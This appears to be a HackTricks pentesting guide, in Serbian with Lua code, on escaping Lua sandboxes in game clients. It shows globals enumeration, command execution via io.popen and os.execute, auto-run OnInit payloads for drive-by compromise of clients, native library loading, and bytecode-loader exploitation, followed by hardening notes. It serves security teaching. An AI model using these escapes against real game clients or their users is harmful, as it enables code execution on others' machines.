# Zaobilaženje Lua sandboxes (embedded VMs, game clients)

{{#include ../../../banners/hacktricks-training.md}}

Ova stranica prikuplja praktične tehnike za enumeraciju i bekstvo iz Lua "sandboxes" ugrađenih u aplikacije (notably game clients, plugins, or in-app scripting engines). Mnogi engine-i izlažu ograničeno Lua okruženje, ali ostavljaju moćne globale dostupne koje omogućavaju proizvoljno izvršavanje komandi ili čak korupciju native memorije kada su izloženi bytecode loaders.

Ključne ideje:
- Posmatrajte VM kao nepoznato okruženje: enumerišite _G i otkrijte koje opasne primitive su dostupne.
- Kada su stdout/print blokirani, zloupotrebite bilo koji in-VM UI/IPC kanal kao output sink da posmatrate rezultate.
- Ako je io/os izložen, često imate direktno izvršavanje komandi (io.popen, os.execute).
- Ako su load/loadstring/loadfile izloženi, izvršavanje pažljivo kreiranog Lua bytecode-a može narušiti sigurnost memorije u nekim verzijama (≤5.1 verifikatori su zaobiđivi; 5.2 je uklonio verifier), omogućavajući naprednu eksploataciju.

## Enumerišite sandboxed okruženje

- Izdumpajte globalno okruženje da inventarišete dostupne tabele/funkcije:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Ako print() nije dostupan, iskoristite in-VM kanale. Primer iz MMO housing script VM-a gde chat izlaz radi samo nakon poziva zvuka; sledeći kod pravi pouzdanu izlaznu funkciju:
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Generalizujte ovaj obrazac za vaš cilj: bilo koji textbox, toast, logger ili UI callback koji prihvata stringove može poslužiti kao stdout za reconnaissance.

## Direct command execution ako su io/os izloženi

Ako sandbox i dalje izlaže standardne biblioteke io ili os, verovatno odmah imate command execution:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Notes:
- Izvršavanje se dešava unutar klijentskog procesa; mnogi anti-cheat/antidebug slojevi koji blokiraju external debuggers neće sprečiti in-VM process creation.
- Takođe proveri: package.loadlib (arbitrary DLL/.so loading), require with native modules, LuaJIT's ffi (if present), and the debug library (can raise privileges inside the VM).

## Zero-click triggers via auto-run callbacks

Ako host application šalje skripte klijentima i VM izlaže auto-run hooks (npr. OnInit/OnLoad/OnEnter), postavi svoj payload tamo za drive-by compromise čim se skripta učita:
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Bilo koji ekvivalentan callback (OnLoad, OnEnter, itd.) generalizuje ovu tehniku kada se skripte automatski prenose i izvršavaju na klijentu.

## Opasni primitivni elementi koje treba tražiti tokom recon

Tokom _G enumeracije, posebno tražite:
- io, os: io.popen, os.execute, file I/O, pristup env.
- load, loadstring, loadfile, dofile: izvršava source ili bytecode; podržava učitavanje nepouzdanog bytecode-a.
- package, package.loadlib, require: dinamičko učitavanje biblioteka i površina modula.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo, i hooks.
- LuaJIT-only: ffi.cdef, ffi.load za direktno pozivanje nativnog koda.

Minimalni primeri upotrebe (ako su dostupni):
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Opcionalna eskalacija: zloupotreba Lua bytecode loadera

Kada su load/loadstring/loadfile dostupni, a io/os ograničeni, izvršavanje pažljivo konstruisanog Lua bytecode-a može dovesti do otkrivanja sadržaja memorije i primitiva za korupciju. Ključne činjenice:
- Lua ≤ 5.1 je dolazio sa bytecode verifier-om koji ima poznate bypasses.
- Lua 5.2 je u potpunosti uklonio verifier (zvanični stav: aplikacije bi trebalo jednostavno da odbace precompiled chunks), čime se proširuje attack surface ako bytecode loading nije zabranjen.
- Tipični workflow-i: leak pointers putem in-VM output-a, konstruisati bytecode za stvaranje type confusions (npr. oko FORLOOP ili drugih opcode-a), zatim pivot na arbitrary read/write ili native code execution.

Ovaj put je specifičan za engine/version i zahteva RE. Pogledajte references za deep dives, exploitation primitives i primere gadgetry u games.

## Detection and hardening notes (for defenders)

- Server side: odbaciti ili prepisati user scripts; allowlist safe APIs; strip ili bind-empty io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
- Client side: pokretati Lua sa minimalnim _ENV-om, zabraniti bytecode loading, ponovo uvesti strogi bytecode verifier ili provere potpisa, i blokirati kreiranje procesa iz procesa klijenta.
- Telemetry: alert na gameclient → child process creation ubrzo nakon učitavanja skripte; korelirati sa UI/chat/script događajima.

## References

- [This House is Haunted: a decade old RCE in the AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [lua-l (2009): Discussion on dropping the bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
